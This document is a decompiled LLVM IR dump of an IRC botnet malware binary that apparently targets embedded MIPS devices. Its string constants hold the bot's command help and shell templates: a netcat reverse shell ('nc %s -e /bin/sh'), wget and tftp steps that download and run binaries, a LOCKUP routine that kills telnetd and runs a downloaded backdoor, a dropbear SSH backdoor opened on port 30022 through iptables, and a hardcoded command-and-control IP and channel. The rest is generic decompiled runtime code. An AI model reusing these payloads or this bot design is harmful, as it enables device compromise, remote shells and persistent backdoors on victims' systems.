@global_var_806c0c4.477 = constant [61 x i8] c"NOTICE %s :    NICK <nick> = Changes the nick of the client\0A\00"
@global_var_806c104.478 = constant [50 x i8] c"NOTICE %s :    SERVER <server> = Changes servers\0A\00"
@global_var_806c138.479 = constant [54 x i8] c"NOTICE %s :    GETSPOOFS = Gets the current spoofing\0A\00"
@global_var_806c170.480 = constant [63 x i8] c"NOTICE %s :    SPOOFS <subnet> = Changes spoofing to a subnet\0A\00"
@global_var_806c1b0.481 = constant [66 x i8] c"NOTICE %s :    DISABLE = Disables all packeting from this client\0A\00"
@global_var_806c1f4.482 = constant [64 x i8] c"NOTICE %s :    ENABLE = Enables all packeting from this client\0A\00"
@global_var_806c234.483 = constant [40 x i8] c"NOTICE %s :    KILL = Kills the knight\0A\00"
@global_var_806c25c.484 = constant [32 x i8] c"NOTICE %s :    DNS2IP <domain>\0A\00"
@global_var_806c27c.485 = constant [101 x i8] c"NOTICE %s :    GET <http address> <save as> = Downloads a file off the web and saves it onto the hd\0A\00"
@global_var_806c2e4.486 = constant [66 x i8] c"NOTICE %s :    UPDATE <http address> <src:bin> = Update this bot\0A\00"
@global_var_806c328.487 = constant [108 x i8] c"NOTICE %s :    HACKPKG <http address> <bin name> = HackPkg is here! Install a bin, using http, no depends!\0A\00"
@global_var_806c394.488 = constant [53 x i8] c"NOTICE %s :    VERSION = Requests version of client\0A\00"
@global_var_806c3cc.489 = constant [54 x i8] c"NOTICE %s :    KILLALL = Kills all current packeting\0A\00"
@global_var_806c404.490 = constant [37 x i8] c"NOTICE %s :    HELP = Displays this\0A\00"
@global_var_806c42c.491 = constant [65 x i8] c"NOTICE %s :    IRC <command> = Sends this command to the server\0A\00"
@global_var_806c470.492 = constant [50 x i8] c"NOTICE %s :    SH <command> = Executes a command\0A\00"
@global_var_806c4a4.493 = constant [66 x i8] c"NOTICE %s :    ISH <command> = SH, interactive, sends to channel\0A\00"
@global_var_806c4e8.494 = constant [69 x i8] c"NOTICE %s :    SHD <command> = Executes a psuedo-daemonized command\0A\00"
@global_var_806c530.495 = constant [59 x i8] c"NOTICE %s :    GETBB <tftp server> = Get a proper busybox\0A\00"
@global_var_806c56c.496 = constant [92 x i8] c"NOTICE %s :    INSTALL  <http server/file_name> = Download & install a binary to /var/bin \0A\00"
@global_var_806c5c8.497 = constant [59 x i8] c"NOTICE %s :    BASH <cmd> = Execute commands using bash. \0A\00"
@global_var_806c604.498 = constant [88 x i8] c"NOTICE %s :    BINUPDATE <http:server/package> = Update a binary in /var/bin via wget \0A\00"
@global_var_806c65c.499 = constant [93 x i8] c"NOTICE %s :    SCAN <nmap options> = Call the nmap wrapper script and scan with your opts. \0A\00"
@global_var_806c6bc.500 = constant [80 x i8] c"NOTICE %s :    RSHELL <server> <port> = Equates to nohup nc ip port -e /bin/sh\0A\00"
@global_var_806c70c.501 = constant [102 x i8] c"NOTICE %s :    LOCKUP <http:server> = Kill telnet, d/l aes backdoor from <server>, run that instead.\0A\00"
@global_var_806c774.502 = constant [111 x i8] c"NOTICE %s :    GETSSH <http:server/dropbearmulti> = D/l, install, configure and start dropbear on port 30022.\0A\00"
@global_var_806c7e3.503 = constant [28 x i8] c"NOTICE %s :Killing pid %d.\0A\00"
@global_var_806c7ff.505 = constant [21 x i8] c"kill -9 %d;kill -9 0\00"
@global_var_806c814.506 = constant [5 x i8] c"%s%s\00"
@global_var_806c819.507 = constant i32 1330511905
@global_var_806c81b.508 = constant [29 x i8] c"NOTICE %s :History cleared!\0A\00"
@global_var_807068c.509 = local_unnamed_addr global i32 2
@global_var_8067fce.510 = constant [12 x i8] c"Kuze-senpai\00"
@global_var_8067fda.511 = constant [9 x i8] c"Morpheus\00"
@global_var_8070690.512 = global [2 x i8*] [i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8067fce.510, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8067fda.511, i32 0, i32 0)]
@global_var_806c930.513 = constant [5 x i8] c"IRC \00"
@global_var_806c935.514 = constant [4 x i8] c"%s\0A\00"
@global_var_806c939.515 = constant [4 x i8] c"SH \00"
@global_var_806c940.516 = constant [69 x i8] c"export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin;%s\00"
@global_var_806c985.517 = constant [15 x i8] c"NOTICE %s :%s\0A\00"
@global_var_806c994.518 = constant [5 x i8] c"SHD \00"
@global_var_806c99c.519 = constant [100 x i8] c"export HOME=/tmp;export;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;trap '' 1 2; sh -c '%s'&\00"
@global_var_806ca00.520 = constant [7 x i8] c"GETBB \00"
@global_var_806ca08.521 = constant [330 x i8] c"export fileGet=busybox-mips;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;cd /var;(([ ! -e /var/\22$fileGet\22 ] || [ ! -s /var/\22$fileGet\22 ]) && tftp -g -r \22$fileGet\22 %s && chmod +x \22$fileGet\22 && ./\22$fileGet\22 mkdir bin && ./\22$fileGet\22 --install -s /var/bin && ls -l \22$fileGet\22 || echo It appears we already have /var/\22$fileGet\22)\00"
@global_var_806cb52.522 = constant [8 x i8] c"GETSSH \00"
@global_var_806cb5c.523 = constant [668 x i8] c"export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;cd /tmp;export url=%s;name=`echo \22$url\22 | sed 's#.*/##'` && wget -O \22$name\22 \22$url\22;chmod +x \22$name\22;mv \22$name\22 /var/bin;ls -l /var/bin/\22$name\22 && dss=/var/dbs/dropbear_dss_host_key;rsa=/var/dbs/dropbear_rsa_host_key;ecd=/var/dbs/dropbear_ecdsa_host_key;cd /var/bin;for i in dropbear dbclient dropbearkey dropbearconvert;do ln -s /var/bin/dropbearmulti $i;done;[ ! -d /var/dbs ] && mkdir /var/dbs;[ -f $dss ] || dropbearkey -t dss -f $dss;[ -f $rsa ] || dropbearkey -t rsa -f $rsa;[ -f $ecd ] || dropbearkey -t ecdsa -f $ecd;dropbear -r $dss -r $rsa -r $ecd -p 30022;iptables -I INPUT 1 -p tcp --dport 30022 -j ACCEPT\00"
@global_var_806cdf8.524 = constant [9 x i8] c"INSTALL \00"
@global_var_806ce04.525 = constant [389 x i8] c"export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;export url=%s;export name=`echo \22$url\22 | sed 's#.*/##'`;(([ ! -e /var/bin/$name ] || [ ! -s /var/bin/$name ]) && echo \22$name either doesnt exist or eq 0 so we get\22 && cd /tmp && wget -O \22$name\22 \22$url\22 && chmod +x \22$name\22 && mv \22$name\22 /var/bin && ([ -f /var/bin/$name ] && ls -l /var/bin/$name) || echo \22It appears I already have $name\22)\00"
@global_var_806cf89.526 = constant [11 x i8] c"BINUPDATE \00"
@global_var_806cf94.527 = constant [371 x i8] c"export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;export url=%s;export name=`echo \22$url\22 | sed 's#.*/##'`;([ -e /var/bin/$name ]) && echo $name exists so we delete it... && rm /var/bin/$name && cd /tmp && wget -O $name $url && chmod +x $name && mv $name /var/bin && ([ -f /var/bin/$name ] && ls -l /var/bin/$name) || echo \22$name doesnt exist, perhaps you mean INSTALL?\22\00"
@global_var_806d107.528 = constant [8 x i8] c"LOCKUP \00"
@global_var_806d110.529 = constant [235 x i8] c"export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;export HOME=/tmp;[ ! -f /var/bin/dmips ] && cd /var/bin;wget -O dmips %s;chmod +x /var/bin/dmips;(killall -9 telnetd || kill -9 telnetd) && (nohup dmips || trap '' 1 2 /var/bin/dmips)\00"
@global_var_806d1fb.530 = constant [8 x i8] c"RSHELL \00"
@global_var_806d204.531 = constant [114 x i8] c"export HOME=/tmp;export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;trap '' 1 2; sh -c 'nohup nc %s -e /bin/sh '&\00"
@global_var_806d276.532 = constant [6 x i8] c"SCAN \00"
@global_var_806d27c.533 = constant [406 x i8] c"export HOME=/tmp;export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;(([ ! -x /var/bin/scan ] || [ ! -x /var/bin/nmap ]) && echo \22I am missing either scan or nmap, and Shellzrus was on Xanax when he wrote this, so you need to do INSTALL http:/\5Cserver/nmap and INSTALL http://server/scan first...\22 && ([ -f /var/bin/nmap ] && ls -l /var/bin/nmap) && ([ -f /var/bin/scan ] && ls -l /var/bin/scan) || scan %s)\00"
@global_var_806d412.534 = constant [6 x i8] c"BASH \00"
@global_var_806d418.535 = constant [98 x i8] c"export HOME=/tmp;export SHELL=/var/bin/bash;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;%s\00"
@global_var_8069449.536 = constant i32 808452096
@global_var_806c838.537 = constant [4 x i8] c"STD\00"
@global_var_8070da0.538 = local_unnamed_addr global [4 x i8]* @global_var_806c838.537
@global_var_8070da4.539 = local_unnamed_addr global i32 134543507
@global_var_806d47a.540 = constant [13 x i8] c"MODE %s -xi\0A\00"
@global_var_807f31c.541 = local_unnamed_addr global i32 0
@global_var_806d487.542 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_806d494.543 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_806d49c.544 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_806d4a8.545 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_8067fc0.550 = constant [14 x i8] c"89.46.222.250\00"
@global_var_8070684.551 = global [14 x i8]* @global_var_8067fc0.550
@global_var_807e0a4.552 = local_unnamed_addr global i32 0
@global_var_807e0a8.553 = local_unnamed_addr global i32 0
@global_var_807e0ac.554 = local_unnamed_addr global i32 0
@global_var_807e0b0.555 = local_unnamed_addr global i32 0
@global_var_807e1d0.556 = local_unnamed_addr global i32 0
@global_var_806d522.557 = constant [7 x i8] c"#owari\00"
@global_var_806d529.558 = constant i32 1308622848
@global_var_806d52c.559 = constant [48 x i8] c"NICK [%s|%s]%s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_806d55c.560 = constant i32 1380253706
@global_var_806d505.561 = constant [4 x i8] c"352\00"
@global_var_8070ee0.562 = global [4 x i8]* @global_var_806d505.561
@global_var_8070ee4.563 = global i32 134570868
@global_var_806d55e.564 = constant [6 x i8] c"ERROR\00"
@global_var_8079c4c.565 = local_unnamed_addr global i32 0
@global_var_8074f40 = external global i32
@global_var_8079c50.566 = local_unnamed_addr global i32 0
@global_var_8079c54.567 = local_unnamed_addr global i32 0
@global_var_8075120.568 = global i32 0
@global_var_807f358.569 = local_unnamed_addr global i32 0
@global_var_8075138.570 = local_unnamed_addr global i32 0
@global_var_8075134.571 = local_unnamed_addr global i32 0
@global_var_8079b00.572 = local_unnamed_addr global i32 0
@global_var_8079b04.573 = local_unnamed_addr global i32 0
@global_var_8075304.574 = local_unnamed_addr global i32 -1
@global_var_8075300.575 = local_unnamed_addr global i32* @global_var_8074f40
@global_var_807f368.576 = local_unnamed_addr global i32 0
@global_var_8075310.577 = local_unnamed_addr global i32 34
@global_var_8070f20.578 = global i32 0
@global_var_8074f20.579 = local_unnamed_addr global i32 2
@global_var_807f35c.580 = local_unnamed_addr global i32 0
@global_var_807f364.581 = local_unnamed_addr global i32 0
@global_var_8075168.582 = global i32 0
@global_var_8075164.583 = local_unnamed_addr global i32* @global_var_8075168.582
@global_var_807516c.584 = local_unnamed_addr global i32 0
@global_var_8075170.585 = global i32 0
@global_var_807530c.586 = local_unnamed_addr global i32 33
@global_var_8075318.587 = local_unnamed_addr global i32 134582833
@global_var_807df14.588 = local_unnamed_addr global i32 0
@global_var_8079b08.589 = local_unnamed_addr global i32 0
@global_var_8079c58.590 = local_unnamed_addr global i32 0
@global_var_8079c5c.591 = local_unnamed_addr global i32 0
@global_var_8070f30.592 = global i32 0
@global_var_807513c.593 = local_unnamed_addr global i32* @global_var_8070f30.592
@global_var_8079b0c.594 = global i32 0
@global_var_8079b24.595 = global i32 0
@global_var_8079b28.596 = global i32 0
@global_var_8079b2c.597 = global i32 0
@global_var_8075530.598 = global i32 0
@global_var_8058270.599 = constant i32 -2062498685
@global_var_8079b40.600 = global i32 0
@global_var_80582c8.601 = constant i32 -2057255805
@global_var_8075308.602 = local_unnamed_addr global i32 32
@global_var_8079c48.603 = global i32 0
@global_var_8079c44.604 = local_unnamed_addr global i32 0
@global_var_80753d8.605 = local_unnamed_addr global i32 35
@global_var_80753dc.606 = local_unnamed_addr global i32 64
@global_var_8079c64.607 = local_unnamed_addr global i32 0
@global_var_8070f40.608 = global i32 0
@global_var_807f370.609 = local_unnamed_addr global i32 0
@global_var_807bcb8.610 = global i32 0
@global_var_807bcbc.611 = global i32 0
@global_var_8074f84.612 = local_unnamed_addr global i32* @global_var_807bcb8.610
@global_var_8074f8c.613 = local_unnamed_addr global i32* @global_var_807bcbc.611
@global_var_8075430.614 = local_unnamed_addr global i32 2
@global_var_8074f54.615 = local_unnamed_addr global i32 0
@global_var_80753fc.617 = global i32* bitcast (i16* @global_var_8075440.616 to i32*)
@global_var_8079c60.618 = local_unnamed_addr global i32 0
@global_var_807f36c.619 = local_unnamed_addr global i32 0
@global_var_80750dc.620 = local_unnamed_addr global i32 0
@global_var_80752cc.622 = local_unnamed_addr global i32 0
@global_var_80752c8.623 = local_unnamed_addr global i32 0
@global_var_8075130.624 = local_unnamed_addr global i32 0
@global_var_8079c68.625 = global i32 0
@global_var_8079c80.626 = global i32 0
@global_var_8079c8c.627 = local_unnamed_addr global i32 0
@global_var_805ae56.628 = constant [4 x i8] c"XZj\00"
@global_var_8079ca0.629 = global i32 0
@global_var_8079ca4.630 = global i32 0
@global_var_807bca0.631 = global i32 0
@global_var_8075418.635 = global i32 0
@global_var_807bcdc.636 = local_unnamed_addr global i32 0
@global_var_807bce0.637 = local_unnamed_addr global i32 0
@global_var_806f1d7.638 = constant [3 x i8] c": \00"
@global_var_806f1d9.639 = constant i32 539828224
@global_var_806d8c0.640 = constant [8 x i8] c"%s%s%m\0A\00"
@global_var_80753f0 = external local_unnamed_addr global i32
@global_var_807bcc0.641 = global i32 0
@global_var_807bcd8.642 = local_unnamed_addr global i32 0
@global_var_806d8c8.643 = constant [3 x i8] c"-c\00"
@global_var_806d8d0.644 = constant [3 x i8] c"sh\00"
@global_var_806d8cb.645 = constant [8 x i8] c"/bin/sh\00"
@global_var_8075400.646 = global i32 0
@global_var_806d8d4.647 = constant i32 0
@global_var_806d8ec.648 = constant [6 x i8] c"(nil)\00"
@global_var_806d8f2.649 = constant [7 x i8] c"(null)\00"
@global_var_806d8f9.650 = constant i32 2949163
@global_var_806d966.652 = constant i32 327688
@global_var_8075640 = external local_unnamed_addr global i32
@global_var_806ec60.654 = constant i32 65536
@global_var_806d95e.655 = constant [8 x i8] c" +0-#'I\00"
@global_var_806d90c.656 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_806d949.657 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_806d93f.658 = constant i32 117506048
@global_var_806d930.659 = constant i32 331776
@global_var_806d9a0.660 = constant [8 x i8] c"Success\00"
@global_var_806d98a.661 = constant [15 x i8] c"Unknown error \00"
@global_var_8075648.662 = local_unnamed_addr global i32* @global_var_806ec60.654
@global_var_807dd00.663 = global i32 0
@global_var_806e520.665 = constant i32 0
@global_var_806e578.666 = constant i32 0
@global_var_806e4fc.667 = constant i32 10
@global_var_806e557.668 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_806e554.670 = constant [3 x i8] c"%x\00"
@global_var_807dd04.671 = global i32 0
@global_var_807dd20.672 = global i32 0
@global_var_807deec.673 = global i32 0
@global_var_8075680.674 = global i32 0
@global_var_807f840.675 = local_unnamed_addr global i32 0
@global_var_807f834.676 = global i32 0
@global_var_806e588.677 = constant [25 x i8] c"%u.%u.%u.%u.in-addr.arpa\00"
@global_var_806e5a1.678 = constant [7 x i8] c"%x.%x.\00"
@global_var_806e5a8.679 = constant [9 x i8] c"ip6.arpa\00"
@global_var_807f380.680 = global i32 0
@global_var_807f42c.682 = global i32 0
@global_var_807f430.683 = local_unnamed_addr global i32 0
@global_var_807f434.684 = global i32 0
@global_var_807f440.685 = local_unnamed_addr global i32 0
@global_var_807f734.686 = global i32 0
@global_var_807f75c.687 = local_unnamed_addr global i32 0
@global_var_807f74c.688 = local_unnamed_addr global i32 0
@global_var_807f750.689 = local_unnamed_addr global i32 0
@global_var_807f754.690 = local_unnamed_addr global i32 0
@global_var_807f770.691 = local_unnamed_addr global i32 0
@global_var_807f758.692 = local_unnamed_addr global i32 0
@global_var_807f764.693 = local_unnamed_addr global i32 0
@global_var_807f768.694 = local_unnamed_addr global i32 0
@global_var_807f774.695 = local_unnamed_addr global i32 0
@global_var_807f748.696 = local_unnamed_addr global i32 0
@global_var_807f744.698 = local_unnamed_addr global i32 0
@global_var_807f76c.699 = local_unnamed_addr global i32 0
@global_var_807f43c.700 = local_unnamed_addr global i32 0
@global_var_8075548.701 = global i32 0
@global_var_8075560.703 = global i32 0
@global_var_8075578 = external global i32
@global_var_80755a4.705 = global i32 -1726662223
@global_var_8075580.706 = local_unnamed_addr global i32* @global_var_80755a4.705
@global_var_807557c.707 = global i32* @global_var_80755a4.705
@global_var_806e5d4.708 = constant i32 0
@global_var_806e5c0.709 = constant i32 0
@global_var_8075620.710 = global i32 0
@global_var_807df04.711 = local_unnamed_addr global i32 0
@global_var_807df10.712 = local_unnamed_addr global i32 0
@global_var_807df08.714 = global i32 0
@global_var_8070628.715 = global i32 -1
@global_var_806191b.716 = constant i32 -294069
@global_var_807df18.717 = local_unnamed_addr global i32 0
@global_var_807df1c.718 = local_unnamed_addr global i32 0
@global_var_806e840.719 = constant [10 x i8] c"/dev/null\00"
@global_var_807df0c.721 = local_unnamed_addr global i32 0
@global_var_8061b03.723 = constant i32 1928542531
@global_var_8061b27.724 = constant i32 1928542531
@global_var_807df40.725 = global i32 0
@global_var_807df24.727 = global i32 0
@global_var_807f80c.728 = global i32 0
@global_var_807f820.729 = global i32 0
@global_var_807f810.730 = global i32 0
@global_var_807f780.731 = global i32 0
@global_var_807e084.732 = local_unnamed_addr global i32 0
@global_var_806ee70.734 = constant [4 x i8] c"inf\00"
@global_var_806ee73.739 = constant i32 1179535616
@global_var_806ee80.740 = constant i32 2883630
@global_var_806ef78.742 = constant [31 x i8] c"clntudp_create: out of memory\0A\00"
@global_var_807564c.743 = global i32 134623909
@global_var_807f800.744 = global i32 0
@global_var_807e008.745 = global i32 0
@global_var_807e024.747 = global i32 0
@global_var_806efc0.753 = constant i32 0
@global_var_806efd8.754 = constant i32 134628425
@global_var_806efe4.755 = constant [36 x i8] c"bad auth_len gid %d str %d auth %d\0A\00"
@global_var_807e03c.756 = global i32 0
@global_var_806f03d.757 = constant i32 0
@global_var_806f008.758 = constant [27 x i8] c"xdr_string: out of memory\0A\00"
@global_var_806f023.759 = constant [26 x i8] c"xdr_bytes: out of memory\0A\00"
@global_var_806f060.760 = constant i32 134630828
@global_var_807e040.761 = local_unnamed_addr global i32 0
@global_var_8075664.762 = global i32 0
@global_var_807e044.763 = local_unnamed_addr global i32 0
@global_var_806f0d1.764 = constant i32 1868824690
@global_var_806f088.765 = constant [14 x i8] c"/etc/services\00"
@global_var_806f096.766 = constant [3 x i8] c"#\0A\00"
@global_var_806f099.767 = constant [3 x i8] c" \09\00"
@global_var_806f09c.768 = constant [3 x i8] c",/\00"
@global_var_807e048.769 = global i32 0
@global_var_807f844.774 = local_unnamed_addr global i32 0
@global_var_806e5a6.775 = constant i32 1885929518
@global_var_806f09f.776 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_806f0b0.777 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_806f0c8.778 = constant [11 x i8] c"nameserver\00"
@global_var_806f0d3.779 = constant [7 x i8] c"domain\00"
@global_var_806f0da.780 = constant [7 x i8] c"search\00"
@global_var_807f824.781 = global i32 0
@global_var_807e078.782 = local_unnamed_addr global i32 0
@global_var_8066532.783 = constant i32 -1592736637
@global_var_807e07c.784 = local_unnamed_addr global i32 0
@global_var_807e080.785 = local_unnamed_addr global i32 0
@global_var_807f848.786 = local_unnamed_addr global i32 0
@global_var_807f84c.787 = local_unnamed_addr global i32 0
@global_var_806f0e4.788 = constant i32 134639200
@global_var_806f0f8.791 = constant [24 x i8] c"__get_myaddress: socket\00"
@global_var_806f110.792 = constant [53 x i8] c"__get_myaddress: ioctl (get interface configuration)\00"
@global_var_806f145.793 = constant [23 x i8] c"__get_myaddress: ioctl\00"
@global_var_806f15c.798 = constant [24 x i8] c"Cannot register service\00"
@global_var_807e08c.799 = local_unnamed_addr global i32 0
@global_var_806f184.800 = constant [26 x i8] c"xdr_array: out of memory\0A\00"
@global_var_806f19e.801 = constant [11 x i8] c"/etc/hosts\00"
@global_var_806f1a9.802 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_806f3c0.803 = constant i32 0
@global_var_806f3c4.804 = constant i32 0
@global_var_806f460.805 = constant [13 x i8] c"RPC: Success\00"
@global_var_806f1bb.806 = constant [26 x i8] c"RPC: (unknown error code)\00"
@global_var_806f1d5.807 = constant [5 x i8] c"%s: \00"
@global_var_806f1da.808 = constant [4 x i8] c" - \00"
@global_var_806f1de.810 = constant [13 x i8] c"; errno = %s\00"
@global_var_806f2a4.811 = constant i32 0
@global_var_806f2e0.812 = constant [18 x i8] c"Authentication OK\00"
@global_var_806f2a0.813 = constant i32 0
@global_var_806f213.814 = constant [9 x i8] c"; why = \00"
@global_var_806f21c.815 = constant [36 x i8] c"(unknown authentication error - %d)\00"
@global_var_806f1eb.816 = constant [40 x i8] c"; low version = %lu, high version = %lu\00"
@global_var_806f240.817 = constant [21 x i8] c"; s1 = %lu, s2 = %lu\00"
@global_var_807062c.818 = global i32 134583441
@global_var_80756a0.20 = local_unnamed_addr global i8 0
@global_var_80756e0.27 = external global i8*
@global_var_80756c8.28 = local_unnamed_addr global i8 0
@global_var_80756cc.33 = external global i8*
@global_var_80756d0.34 = local_unnamed_addr global i64 0
@global_var_807e2e0.88 = local_unnamed_addr global i64 0
@2 = internal constant [5 x i8] c"\03\03\0D3\00"
@global_var_806a120.106 = constant i8* getelementptr inbounds ([5 x i8], [5 x i8]* @2, i32 0, i32 0)
@3 = internal constant [3 x i8] c"0\84\00"
@global_var_806a400.129 = constant i8* getelementptr inbounds ([3 x i8], [3 x i8]* @3, i32 0, i32 0)
@4 = internal constant [2 x i8] c"0\00"
@global_var_806a84d.156 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @4, i32 0, i32 0)
@5 = internal constant [2 x i8] c"$\00"
@6 = internal constant [2 x i8] c">\00"
@7 = internal constant [4 x i8] c"ell\00"
@8 = internal constant [7 x i8] c"usybox\00"
@9 = internal constant [3 x i8] c"ox\00"
@10 = internal constant [4 x i8] c"ror\00"
@11 = internal constant [7 x i8] c"oodbye\00"
@12 = internal constant [3 x i8] c"ye\00"
@13 = internal constant [2 x i8] c"h\00"
@14 = internal constant [6 x i8] c"in/sh\00"
@global_var_80695f6.254 = constant [10 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @5, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @6, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @7, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @8, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @9, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @10, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @11, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @12, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @13, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @14, i32 0, i32 0)]
@global_var_80756cf.546 = external local_unnamed_addr global i8*
@global_var_80756ce.547 = external local_unnamed_addr global i8*
@global_var_80756cd.548 = external global i8*
@global_var_8070680.549 = local_unnamed_addr global i64 578290064774135809
@global_var_8075440.616 = global i16 288
@global_var_80750e0.621 = local_unnamed_addr global i8 0
@global_var_8075490.633 = local_unnamed_addr global i16 272
@global_var_806d97e.651 = external constant i8*
@15 = internal constant [3 x i8] c"\01\06\00"
@global_var_806e527.664 = constant i8* getelementptr inbounds ([3 x i8], [3 x i8]* @15, i32 0, i32 0)
@global_var_807f400.681 = global i8 0
@global_var_807f760.697 = local_unnamed_addr global i8 0
@global_var_807df00.702 = local_unnamed_addr global i8 0
@global_var_807df20.720 = local_unnamed_addr global i8 0
@global_var_806eea0.737 = constant x86_fp80* null
@global_var_807e020.746 = local_unnamed_addr global i8 0
@global_var_807e058.770 = local_unnamed_addr global i8 0
@global_var_807e05c.771 = external global i8*
@global_var_807e074.772 = local_unnamed_addr global i64 0
@global_var_807567c.773 = local_unnamed_addr global i16 1
@global_var_807e088.789 = local_unnamed_addr global i16 0
@global_var_807e089.790 = global i8 0
@global_var_8069c83.83 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 165283
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_80756a0.20, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048102_crit_edge

entry.dec_label_pc_8048102_crit_edge:             ; preds = %entry
  %v0_8048103.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048102

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8070664.22 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8070664.22 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8070664.22 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_80756a0.20, align 32
  br label %dec_label_pc_8048102

dec_label_pc_8048102:                             ; preds = %entry.dec_label_pc_8048102_crit_edge, %dec_label_pc_80480e6
  %v0_8048103 = phi i32 [ %v0_8048103.pre, %entry.dec_label_pc_8048102_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048103

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8070664.22 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_80756a0.20, { 1, 0 }
  uselistorder label %dec_label_pc_8048102, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_804814a, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048145 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_806f624.23 to i32))
  br label %dec_label_pc_804814a

